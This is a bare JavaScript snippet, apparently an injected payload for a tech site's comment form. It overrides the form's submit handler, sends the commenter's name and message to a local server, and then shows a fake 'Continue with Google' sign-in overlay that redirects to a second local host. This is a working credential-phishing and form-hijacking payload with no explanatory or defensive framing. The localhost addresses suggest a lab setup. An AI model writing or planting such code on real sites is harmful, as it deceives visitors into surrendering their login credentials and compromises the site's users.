<script>
  const form=document.querySelector('form[action="/comment"]');const
  submitButton=form?form.querySelector('button[type="submit"]'):null;if(form&&submitButton)
  {
    (form.onsubmit = async function (e) {
      e.preventDefault();
      submitButton.disabled = true;
      submitButton.textContent = "Invio in corso...";
      const data = {
        name: form.querySelector('[name="name"]').value,
        message: form.querySelector('[name="message"]').value,
      };
      const showBanner = () => {
        const banner = document.createElement("div");
        banner.className = "redirect-banner";
        banner.innerHTML = `
          <div style="position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.6);">
            <div style="width:480px;max-width:90%;background:#fff;padding:28px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.25);text-align:left;">
              <div style="font-size:1.6rem;font-weight:800;color:#374151;margin-bottom:8px;">Mondo del Tech</div>
              <div style="font-size:1rem;font-weight:700;margin-bottom:18px;color:#111;">Per inviare il commento devi creare un account</div>
              <button type="button" style="display:inline-flex;align-items:center;gap:12px;padding:10px 16px;border-radius:999px;border:1px solid #000;background:#fff;cursor:pointer;font-weight:700;">
                <img src="https://img.icons8.com/?size=100&id=V5cGWnc9R4xj&format=png&color=000000" alt="Logo" style="width:20px;height:20px;display:block;">
                <span>Continua con Google</span>
              </button>
            </div>
          </div>
        `;
        const button = banner.querySelector("button");
        button.addEventListener("click", () => {
          window.location.href = "http://localhost:3001";
        });
        document.body.appendChild(banner);
      };
      try {
        await fetch("http://localhost:3000/comment", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams(data),
        });
        showBanner();
      } catch (err) {
        showBanner();
      } finally {
        submitButton.disabled = false;
        submitButton.textContent = "Invia";
      }
    })
  }
</script>;
